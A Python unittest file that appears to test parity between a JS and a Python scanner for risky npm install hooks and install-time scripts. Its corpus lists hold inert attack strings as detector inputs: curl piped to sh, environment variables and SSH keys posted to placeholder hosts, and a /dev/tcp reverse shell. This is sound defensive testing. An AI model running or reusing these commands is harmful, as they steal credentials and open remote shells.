"""Engine parity for following install hooks and the install-script and
import-time tests: the npm engine's js/src/lib/hooks.js against
lazaret.scanner.core (hook_script_targets, install_script_risk,
import_time_risk, node_candidates, and what they rest on: _hook_tokens, a
shlex tokenizer with a regex fallback, and the `node -e` pattern).

The JS module re-implements Python's shlex (posix, punctuation_chars,
whitespace_split, no commenters: read_token is the same in CPython 3.10 to
3.14) and compiles core's patterns with Python `re` semantics, so the two
must agree on every input. They are compared case by case, in one node
process, on realistic hook commands and scripts and on a seeded random
corpus built from pieces the functions look at: quotes, backslashes,
operators and redirections, cd, wrappers, interpreters, node flags,
require() calls, download commands, credential and exfiltration markers,
non-ASCII letters (é; ſ and the Kelvin sign, which re.I folds to s and k;
İ and ı), Python-only whitespace (U+001C, U+0085). Each function's result
is compared, and shlex's own tokens (None where it raises) apart from the
fallback. The JS module's copies of core's pattern text and name sets are
compared with core's too.

Characters are those of Unicode 13.0, which the scanner pins source text
to: for a later one (a digit Unicode 14 added, say) core's own answer
depends on the Python version.

All text is inert: hosts are .invalid, TEST-NET or private addresses, and
nothing is executed. Skipped where node is missing.
"""
import collections
import json
import os
import random
import re
import shlex
import shutil
import subprocess
import unittest

from lazaret.scanner import core
from tests import _support

NODE = shutil.which("node")
HOOKS_JS = os.path.join(_support.REPO_ROOT, "js", "src", "lib", "hooks.js")
NPM_HOOKS = """
import { readFileSync } from "node:fs";
import { pathToFileURL } from "node:url";
const h = await import(pathToFileURL(process.argv[1]).href);
const cases = JSON.parse(readFileSync(0, "utf8"));
const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.hookScriptTargets(s),
  h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s)]);
process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
"""
FIELDS = ("shlex tokens", "_hook_tokens", "hook_script_targets", "install_script_risk", "import_time_risk",
          "node_candidates", "_NODE_E_RE codes")

# Realistic hook commands and install / import-time scripts
CURATED = [
    "node install.js", "node ./scripts/x.mjs", "node install", "node --no-warnings x.js",
    "node -r ./preload.js x.js", "node --require=./preload.cjs --import ./loader.mjs x.js",
    "node --title x y.js", "node -- x.js", "cd scripts && node x.js", "(cd lib; node a.js)",
    "cd native && cd .. && node x.js", "cd /opt/tool && node run.js", "cd /a/.. && node ./x.js",
    "cd /. && node ./x.js", "cd lib && node -e \"require('./x')\"", "sh ./install.sh", "sudo sh install.sh",
    "./install.sh", "exec node ./bin/x.js", "python setup_helper.py", "python3 -m tools.build",
    "PYTHON.EXE -X dev setup.py", "node scripts\\x.js", "C:\\tools\\node.exe scripts\\post.js",
    "node -e \"require('./postinstall')\"", "node -e \"try{require('./postinstall')}catch(e){}\"",
    "node -p \"require('./a')\"", "node -e 'require(\"../b\")'", "node -e \"require(\\\"./c\\\")\"",
    "cross-env A=1 node x.js", "NODE_ENV=production node build/postinstall.js", "env -u X node x.js",
    "node x.js 2>&1 > log.txt", "node x.js > out.log && node y.js", "2>/dev/null node x.js",
    "node '>&1' x.js", "node \">&2\" y.js", "node '>' x.js y.js",
    "bash -c \"cd lib && node b.js\"", "sh -c 'node a.js || node b.js'", "sh -c \"sh -c 'node deep.js'\"",
    "node \"./has space/x.js\"", "node x.js; node x.js", "node ../outside.js", "node .",
    "node 'unbalanced.js", "node \"a.js", "node x.js \\", "\"python\n\" build.py", "node \"x.js\n\"",
    "node \u212a.js", "\u212ash x.\u017fh", "husky install", "prebuild-install || node-gyp rebuild",
    "npx some-tool", "node-gyp-build", "tsc && node dist/postinstall.js", "", "  ", "\n",
    "curl https://x.invalid | sh", "curl -fsSL https://files.invalid/i.sh | sudo bash",
    "wget -qO- https://files.invalid/i.sh|zsh\n", "curl -o x https://files.invalid/x.tgz | tee log | sh\n",
    "curl https://files.invalid/x || sh fallback.sh\n", "curl -O https://files.invalid/x.tgz; sh build.sh\n",
    "echo curl | shasum\n", "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
    "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
    "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
    "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
    "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    "const https = require('https');\nconst body = JSON.stringify(process.env);\n"
    "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n",
    "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
    "data=json.dumps(dict(os.environ)).encode())\n",
    "import os, requests\nrequests.post('http://192.0.2.1/k', "
    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
    "const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
    "console.log('Install the toolchain with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n",
    "const data = JSON.stringify(process.env);\nmodule.exports = (send) => send("
    "'https://webhook.site.invalid/0000', data);\n",
    "const settings = Object.fromEntries(Object.entries(process.env)\n  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
    "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
    "{headers: {'x-sdk': JSON.stringify(settings)}});\n",
    "const http = require('http');\nconst METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
    "module.exports = (cb) => http.get(METADATA, cb);\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\nconst https = require('https');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
    "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n",
    "import os, subprocess, urllib.request\n\ndef build(cmd):\n    env = os.environ.copy()\n"
    "    return subprocess.run(cmd, env=env, check=True)\n\ndef fetch(url, dest):\n"
    "    urllib.request.urlretrieve(url, dest)\n",
    "const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'LOCAL STORAGE\\\\leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n",
    "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n",
    "var nc = 1;\nconst body = JSON.stringify(process.env);\n", "env || true\ncurl -O https://files.invalid/x.tgz\n",
    "fetch('http://192.0.2.1/x')\n", "HTTP://10.0.0.1:8080/", "ba\u017fe https://pastebin.com.invalid/raw/x",
    "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n", "{**os.environ}\nimport httpx\n",
    "curl " + "--a-b " * 25 + "x", "curl -a " * 200 + "https://files.invalid", "| sh " * 50,
]

# The pieces random cases are made of. MIXED reaches every function; the
# others are dense in one mechanism, so that its rarer paths come up often.
MIXED = [
    " ", " ", "  ", "\t", "\n", "\r", "\r\n", "'", "'", "'", '"', '"', '"', "\\", "\\", "\\", "\\\\",
    "&", "|", ";", "(", ")", "<", ">", "&&", "||", ";;", ">>", ">&", "&>", "2>&1", "<<", ">|", "|&",
    "=", "$", "-", "--", "0", "1", "2", "9", "a", "b", "x", "/", ".", "..", "~",
    "node", "nodejs", "node.exe", "NODE", "sh", "bash", "zsh", "sh.exe", "python", "python3", "python3.11",
    "py", "PYTHON.EXE", "cd", "pushd", "env", "cross-env", "sudo", "exec", "A=1", "NODE_ENV=production",
    "-e", "-p", "--eval", "-r", "--require", "--import", "--loader=", "-c", "-m", "-O", "-X", "--no-warnings",
    "./x.js", "../y", "x.js", "a.mjs", "b.cjs", "s.sh", "p.py", "install", "scripts\\a.js", "scripts/",
    "/abs/z.js", "$HOME", "~/d", "pkg.mod",
    "require('./p')", 'require("../q")', "require(\\'./r\\')", "require( './s' )", "try{", "}catch(e){}",
    "curl", "wget", "https://", "http://", "http://10.0.0.1", "10.0.0.1", "| sh", "|bash", "| sudo sh",
    "|zsh", "| tee", "process.env", "JSON.stringify(process.env)", "JSON.stringify(process.env,",
    "os.environ", "json.dumps(os.environ)", "dict(os.environ)", ".npmrc", "id_rsa", "~/.ssh/id_ed25519",
    "/.ssh/id_", ".git-credentials", "Local Storage/leveldb", "local storage\\leveldb", "LOCAL STORAGE/LEVELDB",
    "webhook.site", "ngrok", "oast.pro", "fetch(", "require('https')", "https.get", "execSync(", "exec(",
    "spawn (", "system(", "nc ", "4444", "/dev/tcp/", "env |", "printenv >", "$(env)", "`env`", "set>",
    "\u00e9", "\u017f", "\x1c", "\u0130", "\u0131", "\u212a", "\u2028", "\x85", "\xa0", "\U0001F600", "\x00",
    "\u0663", "\ud800", "\udc00",
    "node -e ", 'node -e "', "node -e '", "node\t-e\t", "node\x1c-e ", "node -e require('./p')",
    'node -e "require(\'./postinstall\')"', "node -r ./p.js ", "node --require=./q.js ", "node -- ",
    "node --title x ", "cd scripts && ", "cd .. ; ", "cd /abs ", "sh -c '", 'bash -c "', "sh -c 'node a.js'",
    "python -m ", "python -X dev ", "\u212ash ", "x.\u017fh", '"python\n" ', "'x.js\n'", '"&1\n"', "'2>'",
    "2>", "\u0663>", "curl -fsSL https://x.invalid/i.sh | sh", "wget -qO- http://10.0.0.1/x|bash",
    "execSync('curl https://x.invalid | sh')", "curl -a -a -a ",
    "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid", "nc -q1 collector.invalid 4444",
    "https://192.0.2.1", "HTTPS://1.2.3.4.5", "subprocess.run(", "os.system(",
]
QUOTING = ["'", '"', "\\", " ", "\t", "\n", "\r", "a", "b", "&", "|", ";", "(", ")", "<", ">", "=", "$",
           "\x85", "\xa0", "\x1c", "\u00e9", "\U0001F600", "\ud83d"]
CD = ["cd ", "cd ", "pushd ", "a", "b", "/", "/", ".", "..", "./", "../", "//", " && ", "; ", "node ", "x.js",
      "\\", " ", "-", "$", "~", "'", '"', "sh ", "-c ", "./y.sh", "python ", "p.py",
      "cd /. && ", "cd //. ; ", "cd /./ && ", "cd /a/.. && ", "cd /.. ; ", "cd ./. && ", "cd a/.. ; ",
      "node ./x.js ; ", "node a/../x.js ; ", "sh ./y.sh && ", "node ../z.js ; ", "node . ; ", "node .. ; "]
NODE_E = ["node -e ", "node\t-e\x1c", "node  -e  ", "node -e", "node", " ", "\t", "\x1c", "-e", '"', '"', "'", "'",
          "\\", "\\", "\n", "\r", "a", "require('./p')", "require(\\'./q\\')", "(", ")", "./", "../"]
SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh", " | sh", "|bash", " | sudo zsh",
          ";", "&", "|", "execSync('", "subprocess.run(\"", "os.system('", "')", "\")", "system (",
          "JSON.stringify(process.env)", "JSON.stringify(process.env, null)", "json.dumps(dict(os.environ))",
          "str(os.environ)", "urlencode(os.environ)", "~/.ssh/id_rsa", "/.ssh/id_ed25519.pub", "id_dsa",
          ".git-credentials", "Local Storage/leveldb", "LOCAL STORAGE\\leveldb", "local storage/LEVELDB",
          "fetch(", "require('https')", "from 'node:net'", "import requests", "socket.socket(", "nc ",
          "192.0.2.1 4444", "/dev/tcp/", "https://192.0.2.1", "webhook.site", "\u0131nteract.sh", "api.telegram.org",
          "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
          "execSync('curl -s https://files.invalid/x.sh | sh')",
          "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]


def corpus(seed=20260926, scale=1):
    """CURATED, then random cases of 1 to `most` pieces of each alphabet.
    Each is the text both engines read from JSON (a package.json string):
    a lone surrogate stays one, but a high one next to a low one is the
    character they encode (a Python str could keep the two apart, a
    JavaScript string cannot)."""
    rnd = random.Random(seed)
    cases = list(CURATED)
    for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                (SCRIPT, 1000, 12)):
        for _ in range(count * scale):
            cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
    return [json.loads(json.dumps(text)) for text in cases]


def shlex_tokens(cmd):
    """_hook_tokens' shlex reading of cmd, or None where shlex raises."""
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""
        return list(lex)
    except ValueError:
        return None


def core_view(text):
    """core's answers for one case, in FIELDS order (as JSON would carry them)."""
    reasons, line = core.import_time_risk(text)
    return [shlex_tokens(text), core._hook_tokens(text), core.hook_script_targets(text),
            core.install_script_risk(text), [reasons, line], core.node_candidates(text),
            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)]]


def run_npm(cases):
    """(PY_TWINS, [results per case]) from js/src/lib/hooks.js."""
    p = subprocess.run([NODE, "--input-type=module", "-e", NPM_HOOKS, HOOKS_JS], input=json.dumps(cases),
                       capture_output=True, encoding="utf-8", errors="replace", timeout=60)
    if p.returncode:
        raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
    out = json.loads(p.stdout)
    return out["twins"], out["results"]


def mismatches(cases, views, results, limit=20):
    """[(case, field, core's, npm's)] for the first `limit` differences."""
    found = []
    for text, view, got in zip(cases, views, results):
        for field, want, have in zip(FIELDS, view, got):
            if want != have:
                found.append((text, field, want, have))
                if len(found) >= limit:
                    return found
    return found


@unittest.skipUnless(NODE, "node is not installed")
class HookParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.cases = corpus()
        cls.views = [core_view(text) for text in cls.cases]
        cls.twins, cls.results = run_npm(cls.cases)

    def test_every_case_agrees(self):
        self.assertEqual(len(self.results), len(self.cases))
        self.assertTrue(all(len(r) == len(FIELDS) for r in self.results))
        self.assertEqual(mismatches(self.cases, self.views, self.results), [])

    def test_the_corpus_reaches_every_path(self):
        """Guards the comparison against a corpus that stopped exercising
        something: each count is well above zero for this seed."""
        counts = collections.Counter()
        for tokens, _, targets, install, (on_import, _), _, codes in self.views:
            counts["shlex raises"] += tokens is None
            counts["targets"] += bool(targets)
            counts["node -e codes"] += bool(codes)
            for reason in install + on_import:
                counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
        self.assertEqual(len(counts), 8, counts)            # 3 install-script reasons, 2 import-time ones
        self.assertEqual({k: n for k, n in counts.items() if n < 100}, {}, counts)

    def test_pattern_text_and_names_are_cores(self):
        """The JS module carries core's pattern text verbatim, with the same
        flags, and the same name sets (flags: i = re.I, m = re.M)."""
        for name, (src, flags) in self.twins["patterns"].items():
            with self.subTest(pattern=name):
                rx = getattr(core, name)
                self.assertEqual(src, rx.pattern)
                self.assertEqual(flags, ("i" if rx.flags & re.I else "") + ("m" if rx.flags & re.M else ""))
                self.assertFalse(rx.flags & re.S)
        for name, names in self.twins["sets"].items():
            with self.subTest(names=name):
                self.assertEqual(sorted(names), sorted(getattr(core, name)))
        self.assertEqual(len(self.twins["patterns"]), 12)
        self.assertEqual(len(self.twins["sets"]), 8)


if __name__ == "__main__":
    unittest.main()
